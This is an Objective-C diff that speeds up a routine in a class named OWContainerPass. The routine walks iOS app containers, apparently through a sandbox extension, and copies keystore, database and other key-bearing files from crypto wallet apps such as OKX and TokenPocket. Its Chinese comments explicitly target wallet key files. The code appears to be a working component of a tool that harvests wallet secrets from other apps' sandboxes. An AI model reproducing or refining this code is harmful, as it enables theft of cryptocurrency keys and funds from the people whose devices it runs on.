@@ -128,6 +128,7 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 - (NSDictionary * _Nullable)_definedDirForRel:(NSString *)rel
                                          dirs:(NSArray<NSDictionary *> *)dirs;
 - (void)_restorePayloadsFromDir:(NSString *)dir;
+- (uint64_t)_sizeOf:(NSString *)path;
 @end
 
 @implementation OWContainerPass {
@@ -529,15 +530,21 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     NSSet *lenientExts = [NSSet setWithArray:@[@"plist", @"dat", @"bin", @"keystore",
                                                @"mmkv", @"txt", @"lock", @"json"]];
 
-    NSMutableArray<NSDictionary *> *candidates = [NSMutableArray array];
-    NSMutableArray<NSDictionary *> *indexItems = [NSMutableArray array];
+    NSMutableArray<NSString *> *candidates = [NSMutableArray array];
+    NSMutableArray<NSString *> *indexPaths = [NSMutableArray array];
     NSUInteger foundFiles = 0;
     uint64_t definedBytes = 0;
     NSUInteger scanned = 0;
 
+    // 关键提速：循环里不再对每个目录项做 stat（[en fileAttributes]）。
+    // MHA sandbox extension 下每次 stat 都要过一遍沙箱校验，实测 ~4.8ms/项，
+    // OKX 容器上万项就是 24s。改成只在真正要拷贝/入候选时才 stat。
     NSDirectoryEnumerator *en = [fm enumeratorAtPath:containerPath];
     for (NSString *rel in en) {
-        if (++scanned > 100000) break;
+        if (++scanned > 200000) {
+            OWLog(@"B: %@ 遍历达到安全上限 200000 项，停止", name);
+            break;
+        }
         NSString *lower = rel.lowercaseString;
 
         BOOL skipExcluded = NO;
@@ -549,30 +556,27 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         // 缓存/临时/崩溃日志/媒体目录：整棵子树跳过（既不拷也不索引）
         if (OWIsHeavyRel(lower)) { [en skipDescendants]; continue; }
 
-        NSDictionary *fa = [en fileAttributes];
-        BOOL isDir = [fa[NSFileType] isEqualToString:NSFileTypeDirectory];
-        uint64_t sz = isDir ? 0 : [fa fileSize];
+        if (indexPaths.count < 6000) [indexPaths addObject:rel];
 
-        if (indexItems.count < 5000) {
-            [indexItems addObject:@{@"p": rel, @"s": @(sz), @"d": @(isDir)}];
-        }
-        if (isDir) continue;
+        NSString *full = [containerPath stringByAppendingPathComponent:rel];
 
         // 1) 定义文件（精确路径）
         if ([definedFiles containsObject:rel]) {
-            if ([self _copyItem:[containerPath stringByAppendingPathComponent:rel]
-                          toDir:outDir name:rel.lastPathComponent]) {
+            if ([self _copyItem:full toDir:outDir name:rel.lastPathComponent]) {
                 foundFiles++;
-                definedBytes += sz;
+                definedBytes += [self _sizeOf:full];
             }
-            // sqlite 边车：-wal/-shm 必须跟主库一起走，否则库内容不完整
+            // sqlite 边车：-wal/-shm 必须跟主库一起走，否则库内容不完整。
+            // 若边车本身也被列成了定义件，交给它自己那一轮拷，避免重复。
             for (NSString *suffix in @[@"-wal", @"-shm"]) {
                 NSString *sideRel = [rel stringByAppendingString:suffix];
+                if ([definedFiles containsObject:sideRel]) continue;
                 NSString *side = [containerPath stringByAppendingPathComponent:sideRel];
-                if (![fm fileExistsAtPath:side]) continue;
+                BOOL sideIsDir = NO;
+                if (![fm fileExistsAtPath:side isDirectory:&sideIsDir] || sideIsDir) continue;
                 if ([self _copyItem:side toDir:outDir
                                name:[rel.lastPathComponent stringByAppendingString:suffix]]) {
-                    definedBytes += [[fm attributesOfItemAtPath:side error:nil] fileSize];
+                    definedBytes += [self _sizeOf:side];
                 }
             }
             continue;
@@ -596,26 +600,32 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             }
             BOOL keep = extHit || kwHit;
             if (!keep) {
-                // 典型：TokenPocket 的 Documents/F4SeCyr —— 密钥文件没有扩展名、路径也不含关键词
+                // 典型：TokenPocket 的 Documents/F4SeCyr —— 密钥文件没有扩展名、路径也不含关键词。
+                // 只有走到这里才需要 stat 拿体积。
+                NSDictionary *fa = [fm attributesOfItemAtPath:full error:nil];
+                if (!fa || [fa[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
+                uint64_t sz = [fa fileSize];
                 keep = subExt.length == 0 ||
                        [lenientExts containsObject:subExt] ||
                        (![media containsObject:subExt] && sz <= 2ULL * 1024 * 1024);
             }
             if (!keep) continue;
 
-            NSString *leaf = keep && (extHit || kwHit)
+            BOOL isDir = NO;
+            if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
+
+            NSString *leaf = (extHit || kwHit)
                 ? [sub stringByReplacingOccurrencesOfString:@"/" withString:@"_"]
                 : [NSString stringWithFormat:@"%@_%@", dir[@"tag"],
                    [sub stringByReplacingOccurrencesOfString:@"/" withString:@"_"]];
-            if ([self _copyItem:[containerPath stringByAppendingPathComponent:rel]
-                          toDir:outDir name:leaf]) {
+            if ([self _copyItem:full toDir:outDir name:leaf]) {
                 foundFiles++;
-                definedBytes += sz;
+                definedBytes += [self _sizeOf:full];
             }
             continue;
         }
 
-        // 3) 容器其它位置：只记候选，等遍历结束看定义件是否足够
+        // 3) 容器其它位置：只记候选路径，等遍历结束看定义件是否足够
         if (candidates.count >= 4000) continue;
         if ([media containsObject:lower.pathExtension]) continue;
         if ([lower containsString:@"com.apple.mobile_container_manager.metadata.plist"]) continue;
@@ -631,7 +641,11 @@ static NSArray<NSDictionary *> *OWTargets(void) {
                 if ([lower rangeOfString:k].location != NSNotFound) { hit = YES; break; }
             }
         }
-        if (hit) [candidates addObject:@{@"rel": rel, @"size": @(sz)}];
+        if (!hit) continue;
+
+        BOOL candIsDir = NO;
+        if (![fm fileExistsAtPath:full isDirectory:&candIsDir] || candIsDir) continue;
+        [candidates addObject:rel];
     }
 
     OWLog(@"B: %@ 定义件命中 %lu/%lu，有效 %llu B", name,
@@ -644,22 +658,23 @@ static NSArray<NSDictionary *> *OWTargets(void) {
               name, (unsigned long)foundFiles, definedBytes, (unsigned long)candidates.count);
         NSUInteger copied = 0;
         uint64_t bytes = 0;
-        for (NSDictionary *c in candidates) {
+        for (NSString *rel in candidates) {
             if (copied >= 2000 || bytes >= 50ULL * 1024 * 1024) break;
             if (_collectedBytes >= self.maxContainerBytes) break;
-            NSString *rel = c[@"rel"];
             NSString *leaf = [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
-            if ([self _copyItem:[containerPath stringByAppendingPathComponent:rel]
-                          toDir:outDir name:leaf]) {
+            NSString *full = [containerPath stringByAppendingPathComponent:rel];
+            if ([self _copyItem:full toDir:outDir name:leaf]) {
                 copied++;
-                bytes += [c[@"size"] unsignedLongLongValue];
+                bytes += [self _sizeOf:full];
             }
         }
         OWLog(@"B: 兜底扫描 %@ 命中 %lu 个 / %llu B", name,
               (unsigned long)copied, bytes);
     }
 
-    // 文件索引：即使内容没拷到，也能看到容器里有什么
+    // 文件索引：即使内容没拷到，也能看到容器里有什么（只记路径，不 stat）
+    NSMutableArray *indexItems = [NSMutableArray arrayWithCapacity:indexPaths.count];
+    for (NSString *rel in indexPaths) [indexItems addObject:@{@"p": rel}];
     NSDictionary *idx = @{
         @"target": target[@"name"] ?: @"",
         @"bundleId": target[@"bundleId"] ?: @"",
@@ -671,7 +686,11 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         [d writeToFile:[outDir stringByAppendingPathComponent:@"_file_index.json"]
             atomically:YES];
     }
-    OWLog(@"B: 索引 %@ %lu 条", name, (unsigned long)indexItems.count);
+    OWLog(@"B: 索引 %@ %lu 条", name, (unsigned long)indexPaths.count);
+}
+
+- (uint64_t)_sizeOf:(NSString *)path {
+    return [[[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil] fileSize];
 }
 
 - (NSString *)_stripSidecarSuffix:(NSString *)rel {
